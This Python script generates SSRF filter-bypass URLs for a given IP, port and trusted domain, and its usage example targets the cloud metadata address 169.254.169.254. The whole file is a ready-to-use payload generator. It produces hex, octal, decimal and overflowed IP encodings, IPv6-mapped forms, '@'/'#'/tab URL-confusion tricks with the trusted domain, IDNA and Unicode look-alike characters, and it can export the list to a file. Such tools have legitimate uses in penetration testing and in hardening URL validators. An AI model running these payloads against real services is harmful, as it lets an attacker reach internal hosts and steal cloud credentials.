#!/usr/bin/python
# coding=utf-8

from __future__ import print_function
from random import *
from io import open
import datetime
import string
import os
import sys
import platform
import random

UnicodeLove = {
	'0' : ['⓪','０','𝟎','𝟘','𝟢','𝟬','𝟶','⁰','₀'],
	'1' : ['①','１','𝟏','𝟙','𝟣','𝟭','𝟷','¹','₁'],
	'2' : ['②','２','𝟐','𝟚','𝟤','𝟮','𝟸','²','₂'],
	'3' : ['③','３','𝟑','𝟛','𝟥','𝟯','𝟹','³','₃'],
	'4' : ['④','４','𝟒','𝟜','𝟦','𝟰','𝟺','⁴','₄'],
	'5' : ['⑤','５','𝟓','𝟝','𝟧','𝟱','𝟻','⁵','₅'],
	'6' : ['⑥','６','𝟔','𝟞','𝟨','𝟲','𝟼','⁶','₆'],
	'7' : ['⑦','７','𝟕','𝟟','𝟩','𝟳','𝟽','⁷','₇'],
	'8' : ['⑧','８','𝟖','𝟠','𝟪','𝟴','𝟾','⁸','₈'],
	'9' : ['⑨','９','𝟗','𝟡','𝟫','𝟵','𝟿','⁹','₉'],
	'10' : ['⑩'],
	'11' : ['⑪'],
	'12' : ['⑫'],
	'13' : ['⑬'],
	'14' : ['⑭'],
	'15' : ['⑮'],
	'16' : ['⑯'],
	'17' : ['⑰'],
	'18' : ['⑱'],
	'19' : ['⑲'],
	'20' : ['⑳'],
	'.' : ['。','｡','．'],
	'a' : ['ａ','𝐚','𝑎','𝒂','𝒶','𝓪','𝔞','𝕒','𝖆','𝖺','𝗮','𝘢','𝙖','𝚊','ⓐ','Ａ','𝐀','𝐴','𝑨','𝒜','𝓐','𝔄','𝔸','𝕬','𝖠','𝗔','𝘈','𝘼','𝙰','Ⓐ','ª','ᵃ','ₐ','ᴬ','🄰'],
	'b' : ['ｂ','𝐛','𝑏','𝒃','𝒷','𝓫','𝔟','𝕓','𝖇','𝖻','𝗯','𝘣','𝙗','𝚋','ⓑ','Ｂ','ℬ','𝐁','𝐵','𝑩','𝓑','𝔅','𝔹','𝕭','𝖡','𝗕','𝘉','𝘽','𝙱','Ⓑ','ᵇ','ᴮ','🄱'],
	'c' : ['ｃ','ⅽ','𝐜','𝑐','𝒄','𝒸','𝓬','𝔠','𝕔','𝖈','𝖼','𝗰','𝘤','𝙘','𝚌','ⓒ','Ｃ','Ⅽ','ℂ','ℭ','𝐂','𝐶','𝑪','𝒞','𝓒','𝕮','𝖢','𝗖','𝘊','𝘾','𝙲','Ⓒ','🄫','ᶜ','🄲'],
	'd' : ['ｄ','ⅾ','ⅆ','𝐝','𝑑','𝒅','𝒹','𝓭','𝔡','𝕕','𝖉','𝖽','𝗱','𝘥','𝙙','𝚍','ⓓ','Ｄ','Ⅾ','ⅅ','𝐃','𝐷','𝑫','𝒟','𝓓','𝔇','𝔻','𝕯','𝖣','𝗗','𝘋','𝘿','𝙳','Ⓓ','ᵈ','ᴰ','🄳'],
	'e' : ['ｅ','ℯ','ⅇ','𝐞','𝑒','𝒆','𝓮','𝔢','𝕖','𝖊','𝖾','𝗲','𝘦','𝙚','𝚎','ⓔ','Ｅ','ℰ','𝐄','𝐸','𝑬','𝓔','𝔈','𝔼','𝕰','𝖤','𝗘','𝘌','𝙀','𝙴','Ⓔ','ᵉ','ₑ','ᴱ','🄴'],
	'f' : ['ｆ','𝐟','𝑓','𝒇','𝒻','𝓯','𝔣','𝕗','𝖋','𝖿','𝗳','𝘧','𝙛','𝚏','ⓕ','Ｆ','ℱ','𝐅','𝐹','𝑭','𝓕','𝔉','𝔽','𝕱','𝖥','𝗙','𝘍','𝙁','𝙵','Ⓕ','ᶠ','🄵'],
	'x' : ['ｘ','ⅹ','𝐱','𝑥','𝒙','𝓍','𝔁','𝔵','𝕩','𝖝','𝗑','𝘅','𝘹','𝙭','𝚡','ⓧ','Ｘ','Ⅹ','𝐗','𝑋','𝑿','𝒳','𝓧','𝔛','𝕏','𝖃','𝖷','𝗫','𝘟','𝙓','𝚇','Ⓧ','ˣ','ₓ','🅇'],
}

RANDOM3NUMBERS = str(randint(0, 9))+str(randint(0, 9))+str(randint(0, 9))

def RANDOM_TEXT_SPEC():
	min_char = 12
	max_char = 16
	chars = string.ascii_letters + string.digits + "!$%^&*()<>;:,.|\~`"
	return "".join(choice(chars) for x in range(randint(min_char, max_char)))

def RANDOM_TEXT():
	min_char = 12
	max_char = 16
	chars = string.ascii_letters + string.digits
	return "".join(choice(chars) for x in range(randint(min_char, max_char)))

def DECIMAL_SINGLE(NUMBER,STEP):
	return int(NUMBER)*(256**STEP)

def HEX_SINGLE(NUMBER,ADD0X):
	if ADD0X == "yes":
		return str(hex(int(NUMBER)))
	else:
		return str(hex(int(NUMBER))).replace("0x","")

def OCT_SINGLE(NUMBER):
	return str(oct(int(NUMBER))).replace("o","")

def DEC_OVERFLOW_SINGLE(NUMBER):
	return str(int(NUMBER)+256)

def validIP(address):
	parts = address.split(".")
	if len(parts) != 4:
		return False
	try:
		for item in parts:
			if not 0 <= int(item) <= 255:
				return False
	except ValueError:
		print("\nUsage: python "+sys.argv[0]+" IP EXPORT(optional)\nUsage: python "+sys.argv[0]+" 169.254.169.254\nUsage: python "+sys.argv[0]+" 169.254.169.254 export")
		exit(1)
	return True

def plain2EnclosedAlphanumericsChar(s0):
	if s0 not in UnicodeLove:
		raise Exception('value not found')
	return random.choice(UnicodeLove[s0])

def convertIP2RandomUnicodeValue():
	IPAddressParts4EnclosedAlphanumerics = arg1.split(".")
	returnEnclosedAlphanumericsIPAddress = ""
	for x in range(0,4):
		if len(IPAddressParts4EnclosedAlphanumerics[x]) == 3 and (int(IPAddressParts4EnclosedAlphanumerics[x][0]+IPAddressParts4EnclosedAlphanumerics[x][1])) <= 20 and (int(IPAddressParts4EnclosedAlphanumerics[x][0]+IPAddressParts4EnclosedAlphanumerics[x][1]+IPAddressParts4EnclosedAlphanumerics[x][2])) >= 10:
			returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][0]+IPAddressParts4EnclosedAlphanumerics[x][1]);
			returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][2]);
			if x <= 2:
				returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar('.');
		else:
			returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][0]);
			if len(IPAddressParts4EnclosedAlphanumerics[x]) >= 2:
				returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][1]);
			if len(IPAddressParts4EnclosedAlphanumerics[x]) == 3:
				returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar(IPAddressParts4EnclosedAlphanumerics[x][2]);
			if x <= 2:
				returnEnclosedAlphanumericsIPAddress = returnEnclosedAlphanumericsIPAddress + plain2EnclosedAlphanumericsChar('.');
	return returnEnclosedAlphanumericsIPAddress

def convert(s, recurse_chunks=True, error_on_miss=False):
		if s in UnicodeLove:
			return random.choice(UnicodeLove[s])
		if recurse_chunks and len(s) > 1:
			return convert(s[:-1]) + convert(s[-1])
		if error_on_miss:
			raise Exception('Value not found: %s' % s)
		return s

def convert_ip(ip, sep='.'):
	return convert(sep).join([convert(chunk) for chunk in ip.split(sep)])

def PrintAndWrite(IPAddress):
	print('http://',IPAddress,':',PORT,'/',sep='')
	print('http://',IPAddress,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')
	print('http://',IPAddress,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@',IPAddress,':',PORT,'/',sep='')
	print('http://',RANDPREFIXTEXT,'@',IP1,':',PORT,'/',sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IPAddress,':',PORT,'/',sep='')
	print('http://',RANDPREFIXTEXT,'@',IPAddress,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IPAddress,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')
	print('http://',RANDPREFIXTEXT,'@',IPAddress,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',IPAddress,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')
	print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IPAddress,':',PORT,'/',sep='')
	print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IPAddress,':',PORT,'/',sep='')
	print('http://',IPAddress,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',IPAddress,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IPAddress,':',PORT,'/',sep='')
	print('http://',IPAddress,':',PORT,':80','/',sep='')
	print('http://',IPAddress,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',sep='')
	print('http://',IPAddress,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')
	print('http://',IPAddress,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')
	print('http://',IPAddress,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@@',IPAddress,':',PORT,'/',sep='')
	print('http://',RANDOMPREFIXVALIDSITE,'@@@',IPAddress,':',PORT,'/',sep='')
	print('0://',IPAddress,':',PORT,';',RANDOMPREFIXVALIDSITE,':80','/',sep='')
	print('http://',IPAddress,':',PORT,';',RANDOMPREFIXVALIDSITE,':80','/',sep='')
	print('0://',IPAddress,':',PORT,',',RANDOMPREFIXVALIDSITE,':80','/',sep='')
	print('http://',IPAddress,':',PORT,',',RANDOMPREFIXVALIDSITE,':80','/',sep='')
	print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
	print("\n",sep='')
	if EXPORTRESULTS == 'export':
		print('http://',IPAddress,':',PORT,'/',file=f,sep='')
		print('http://',IPAddress,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
		print('http://',IPAddress,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
		print('http://',RANDOMPREFIXVALIDSITE,'@',IPAddress,':',PORT,'/',file=f,sep='')
		print('http://',RANDPREFIXTEXT,'@',IPAddress,':',PORT,'/',file=f,sep='')
		print('http://',RANDPREFIXTEXTSPEC,'@',IPAddress,':',PORT,'/',file=f,sep='')
		print('http://',RANDPREFIXTEXT,'@',IPAddress,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
		print('http://',RANDPREFIXTEXTSPEC,'@',IPAddress,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
		print('http://',RANDPREFIXTEXT,'@',IPAddress,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
		print('http://',RANDPREFIXTEXTSPEC,'@',IPAddress,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
		print('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IPAddress,':',PORT,'/',file=f,sep='')
		print('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IPAddress,':',PORT,'/',file=f,sep='')
		print('http://',IPAddress,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
		print('http://',RANDOMPREFIXVALIDSITE,'+&@',IPAddress,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
		print('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IPAddress,':',PORT,'/',file=f,sep='')
		print('http://',IPAddress,':',PORT,':80','/',file=f,sep='')
		print('http://',IPAddress,':',PORT,'\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
		print('http://',IPAddress,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
		print('http://',IPAddress,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')
		print('http://',IPAddress,'%20',RANDOMPREFIXVALIDSITE,':',PORT,'/',file=f,sep='')
		print('http://',RANDOMPREFIXVALIDSITE,'@@',IPAddress,':',PORT,'/',file=f,sep='')
		print('http://',RANDOMPREFIXVALIDSITE,'@@@',IPAddress,':',PORT,'/',file=f,sep='')
		print('0://',IPAddress,':',PORT,';',RANDOMPREFIXVALIDSITE,':80','/',file=f,sep='')
		print('http://',IPAddress,':',PORT,';',RANDOMPREFIXVALIDSITE,':80','/',file=f,sep='')
		print('0://',IPAddress,':',PORT,',',RANDOMPREFIXVALIDSITE,':80','/',file=f,sep='')
		print('http://',IPAddress,':',PORT,',',RANDOMPREFIXVALIDSITE,':80','/',file=f,sep='')

def PrintAndWriteUnicode(IP1, IP2, IP3, IP4, IP5, IP6, IP7, IP13, IP8, IP14, IP9, IP10, IP11, IP12):
	print('http://',convertIP2RandomUnicodeValue(),'/',sep='')
	print('http://',convert_ip(IP1),':',PORT,'/',sep='')
	print('http://',convert_ip(IP2),':',PORT,'/',sep='')
	print('http://',convert_ip(IP3),':',PORT,'/',sep='')
	print('http://',convert_ip(IP4),':',PORT,'/',sep='')
	print('http://',convert_ip(IP5),':',PORT,'/',sep='')
	print('http://',convert_ip(IP6),':',PORT,'/',sep='')
	print('http://',convert_ip(IP7),':',PORT,'/',sep='')
	print('http://',convert_ip(IP13),':',PORT,'/',sep='')
	print('http://',convert_ip(IP8),':',PORT,'/',sep='')
	print('http://',convert_ip(IP14),':',PORT,'/',sep='')
	print('http://',convert_ip(IP9),':',PORT,'/',sep='')
	print('http://',convert_ip(IP10),':',PORT,'/',sep='')
	print('http://',convert_ip(IP11),':',PORT,'/',sep='')
	print('http://',convert_ip(IP12),':',PORT,'/',sep='')
	print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
	print("\n",sep='')
	if EXPORTRESULTS == 'export':
		print('http://',convertIP2RandomUnicodeValue(),'/',file=f,sep='')
		print('http://',convert_ip(IP1),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP2),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP3),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP4),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP5),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP6),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP7),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP13),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP8),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP14),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP9),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP10),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP11),':',PORT,'/',file=f,sep='')
		print('http://',convert_ip(IP12),':',PORT,'/',file=f,sep='')

if len(sys.argv) < 4 or len(sys.argv) >= 6:
	print("\nUsage: python "+sys.argv[0]+" IP PORT WhiteListedDomain EXPORT(optional)\nUsage: python "+sys.argv[0]+" 169.254.169.254 80 www.google.com\nUsage: python "+sys.argv[0]+" 169.254.169.254 80 www.google.com export")
	exit(1)

redcolor='\x1b[0;31;40m'
greencolor='\x1b[0;32;40m'
yellowcolor='\x1b[0;33;40m'
bluecolor='\x1b[0;36;40m'
resetcolor='\x1b[0m'
arg1 = str(sys.argv[1])

if validIP(arg1) == False:
	print("\n",yellowcolor,arg1,resetcolor,redcolor," is not a valid IPv4 address in dotted decimal format, example: 123.123.123.123",resetcolor,sep='')
	print("\nUsage: python "+sys.argv[0]+" IP EXPORT(optional)\nUsage: python "+sys.argv[0]+" 169.254.169.254\nUsage: python "+sys.argv[0]+" 169.254.169.254 export")
	exit(1)

ipFrag3, ipFrag2, ipFrag1, ipFrag0 = arg1.split(".")
global PORT
PORT=str(sys.argv[2])
global RANDPREFIXTEXT
RANDPREFIXTEXT=RANDOM_TEXT()
global RANDPREFIXTEXTSPEC
RANDPREFIXTEXTSPEC=RANDOM_TEXT_SPEC()
global RANDOMPREFIXVALIDSITE
RANDOMPREFIXVALIDSITE=str(sys.argv[3])
FILENAME=''

try:
	sys.argv[4]
except IndexError:
	EXPORTRESULTS=''
else:
	EXPORTRESULTS=str(sys.argv[4])

if EXPORTRESULTS == 'export':
	FILENAME = "export-" + arg1 + "-" + str(datetime.datetime.now().strftime("%H-%M-%d-%m-%Y"))+'.txt'
	global f
	pythonversion = (platform.python_version())
	major, minor, patchlevel = pythonversion.split(".")
	if major == "3":
		f = open(FILENAME, 'w')
	else:
		f = open(FILENAME, 'wb')
elif EXPORTRESULTS != '':
	print("\nUsage: python "+sys.argv[0]+" IP WhiteListedDomain EXPORT(optional)\nUsage: python "+sys.argv[0]+" 169.254.169.254 80 www.google.com\nUsage: python "+sys.argv[0]+" 169.254.169.254 80 www.google.com export")
	exit(1)

#Case 1 - Dotted hexadecimal
print("\n",sep='')
print(bluecolor,"Dotted hexadecimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP1 = HEX_SINGLE(ipFrag3,"yes") + "." + HEX_SINGLE(ipFrag2,"yes") + "." + HEX_SINGLE(ipFrag1,"yes") + "." + HEX_SINGLE(ipFrag0,"yes")
PrintAndWrite(IP1)

#Case 2 - Dotless hexadecimal
print(bluecolor,"Dotless hexadecimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP2 = HEX_SINGLE(ipFrag3,"yes") + HEX_SINGLE(ipFrag2,"no") + HEX_SINGLE(ipFrag1,"no") + HEX_SINGLE(ipFrag0,"no")
PrintAndWrite(IP2)

#Case 3 - Dotless decimal
print(bluecolor,"Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP3 = str(DECIMAL_SINGLE(ipFrag3,3) + DECIMAL_SINGLE(ipFrag2,2) + DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
PrintAndWrite(IP3)

#Case 4 - Dotted decimal with overflow(256)
print(bluecolor,"Dotted decimal with overflow(256) IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP4 = DEC_OVERFLOW_SINGLE(ipFrag3) + "." + DEC_OVERFLOW_SINGLE(ipFrag2) + "." + DEC_OVERFLOW_SINGLE(ipFrag1) + "." + DEC_OVERFLOW_SINGLE(ipFrag0)
PrintAndWrite(IP4)

#Case 5 - Dotted octal
print(bluecolor,"Dotted octal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP5 = OCT_SINGLE(ipFrag3) + "." + OCT_SINGLE(ipFrag2) + "." + OCT_SINGLE(ipFrag1) + "." + OCT_SINGLE(ipFrag0)
PrintAndWrite(IP5)

#Case 6 - Dotted octal with padding
print(bluecolor,"Dotted octal with padding IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP6 = '0' + OCT_SINGLE(ipFrag3) + "." + '00' + OCT_SINGLE(ipFrag2) + "." + '000' + OCT_SINGLE(ipFrag1) + "." + '0000' + OCT_SINGLE(ipFrag0)
PrintAndWrite(IP6)

#Case 7 - IPv6 compact version
print(bluecolor,"IPv6 compact version IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP7 = '[::' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + ']'
PrintAndWrite(IP7)

#Case 17 - IPv6 compact version with % bypass
print(bluecolor,"IPv6 compact version with % bypass IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP13 = '[::' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + '%'+RANDOM3NUMBERS+']'
PrintAndWrite(IP13)

#Case 8 - IPv6 mapped version
print(bluecolor,"IPv6 mapped version IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP8 = '[::ffff:' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + ']'
PrintAndWrite(IP8)

#Case 16 - IPv6 mapped version with % bypass
print(bluecolor,"IPv6 mapped version with % bypass IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP14 = '[::ffff:' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + '%'+RANDOM3NUMBERS+']'
PrintAndWrite(IP14)

#Case 9 - Dotted hexadecimal + Dotted octal + Dotless decimal
print(bluecolor,"Dotted hexadecimal + Dotted octal + Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP9 = HEX_SINGLE(ipFrag3,"yes") + "." + OCT_SINGLE(ipFrag2) + "." + str(DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
PrintAndWrite(IP9)

#Case 10 - Dotted hexadecimal + Dotless decimal
print(bluecolor,"Dotted hexadecimal + Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP10 = HEX_SINGLE(ipFrag3,"yes") + "." + str(DECIMAL_SINGLE(ipFrag2,2) + DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
PrintAndWrite(IP10)

#Case 11 - Dotted octal with padding + Dotless decimal
print(bluecolor,"Dotted octal with padding + Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP11 = '0' + OCT_SINGLE(ipFrag3) + "." + str(DECIMAL_SINGLE(ipFrag2,2) + DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
PrintAndWrite(IP11)

#Case 12 - Dotted octal with padding + Dotted hexadecimal + Dotless decimal
print(bluecolor,"Dotted octal with padding + Dotted hexadecimal + Dotless decimal IP Address of:",resetcolor,yellowcolor," http://",arg1,resetcolor,bluecolor," + authentication prefix/bypass combo list",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
IP12 = '0' + OCT_SINGLE(ipFrag3) + "." + HEX_SINGLE(ipFrag2,"yes") + "." + str(DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
PrintAndWrite(IP12)

#Case 13 - Abusing IDNA Standard
print(bluecolor,"Abusing IDNA Standard: ",resetcolor,yellowcolor,"http://ß.localdomain.pw/", resetcolor,' -> ',yellowcolor,'http://cc.localdomain.pw/',resetcolor,' => ',bluecolor,'DNS',resetcolor,' => ',yellowcolor,'127.127.127.127',resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print('http://ß.localdomain.pw/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://ß.localdomain.pw/',file=f,sep='')

#Case 14 - Abusing 。and ｡
IPAddressParts = arg1.split(".")
print(bluecolor,"Abusing 。and ｡ and ．: ",resetcolor,yellowcolor,"http://",IPAddressParts[0],"。",IPAddressParts[1],"。",IPAddressParts[2],"。",IPAddressParts[3],"/",resetcolor," and " ,yellowcolor,"http://",IPAddressParts[0],"｡",IPAddressParts[1],"｡",IPAddressParts[2],"｡",IPAddressParts[3],"/", resetcolor, " and " ,yellowcolor,"http://",IPAddressParts[0],"．",IPAddressParts[1],"．",IPAddressParts[2],"．",IPAddressParts[3],"/", resetcolor,' -> ',yellowcolor,"http://",IPAddressParts[0],".",IPAddressParts[1],".",IPAddressParts[2],".",IPAddressParts[3],"/",resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print('http://',IPAddressParts[0],'。',IPAddressParts[1],'。',IPAddressParts[2],'。',IPAddressParts[3],'/',sep='')
print('http://',IPAddressParts[0],'｡',IPAddressParts[1],'｡',IPAddressParts[2],'｡',IPAddressParts[3],'/',sep='')
print('http://',IPAddressParts[0],'．',IPAddressParts[1],'．',IPAddressParts[2],'．',IPAddressParts[3],'/',sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
print("\n",sep='')
if EXPORTRESULTS == 'export':
	print('http://',IPAddressParts[0],'。',IPAddressParts[1],'。',IPAddressParts[2],'。',IPAddressParts[3],'/',file=f,sep='')
	print('http://',IPAddressParts[0],'｡',IPAddressParts[1],'｡',IPAddressParts[2],'｡',IPAddressParts[3],'/',file=f,sep='')
	print('http://',IPAddressParts[0],'．',IPAddressParts[1],'．',IPAddressParts[2],'．',IPAddressParts[3],'/',file=f,sep='')

#Case 15 Abusing Unicode
print(bluecolor,"Abusing Unicode:",resetcolor," ",yellowcolor,'http://',convertIP2RandomUnicodeValue(), resetcolor,'        -> ',yellowcolor,"http://",arg1,resetcolor,sep='')
print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
PrintAndWriteUnicode(IP1, IP2, IP3, IP4, IP5, IP6, IP7, IP13, IP8, IP14, IP9, IP10, IP11, IP12)

if EXPORTRESULTS == 'export':
	f.close()
	print("\n",bluecolor,'-----------------------------------------------------------------------------------------------------------------------------------------',resetcolor,sep='')
	print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
	print("Results are exported to: " + FILENAME,sep='')
	print(greencolor,'=========================================================================================================================================',resetcolor,sep='')
	print(bluecolor,'-----------------------------------------------------------------------------------------------------------------------------------------',resetcolor,sep='')
	print("\n",sep='')
